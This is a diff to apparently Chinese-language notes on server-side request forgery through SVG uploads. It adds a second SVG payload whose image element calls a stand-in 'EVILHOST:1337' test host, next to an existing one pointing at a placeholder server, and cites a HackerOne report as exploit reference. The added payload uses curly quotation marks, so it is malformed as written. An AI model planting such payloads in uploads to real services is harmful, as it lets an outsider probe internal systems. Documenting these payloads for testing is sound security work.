@@ -46,6 +46,11 @@ Content-Type: image/svg+xml
 
 ```
 <?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="http://<EXAMPLE_SERVER>/image.jpeg" /></svg>
+
+
+<svg xmlns:svg=”http://w3.org/2000/svg" xmlns=”http://w3.org/2000/svg" xmlns:xlink=”http://w3.org/1999/xlink" width=”200" height=”200">
+<image height=”30" width=”30" xlink:href=”http://EVILHOST:1337/SVG-SSRF-TEST" />
+</svg>
 ```
 
 利用参考:https://hackerone.com/reports/223203
